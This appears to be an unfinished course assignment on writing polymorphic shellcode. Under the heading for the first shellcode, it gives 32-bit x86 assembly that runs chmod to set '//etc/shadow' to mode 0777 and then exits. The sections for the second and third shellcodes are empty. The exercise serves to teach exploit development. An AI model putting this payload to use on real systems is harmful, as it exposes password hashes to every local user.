Assignment #6, Polymorphic Shellcode
====================================

Instructions:
-------------
* Take up 3 shellcodes from shell-storm and create polymorphic versions of them
* The polymorphic version *cannot* be larger than 150% of existing one
* Bonus point for making it shorter than original

Shellcode 1 (33 bytes, http://shell-storm.org/shellcode/files/shellcode-590.php):
---------------------------------------------------------------------------------
```
xor %eax,%eax
push %eax
mov $0xf,%al
push $0x776f6461
push $0x68732f63
push $0x74652f2f
mov %esp,%ebx
xor %ecx,%ecx
mov $0x1ff,%cx
int $0x80
inc %eax
int $0x80
```

Shellcode 2:
------------


Shellcode 3:
------------
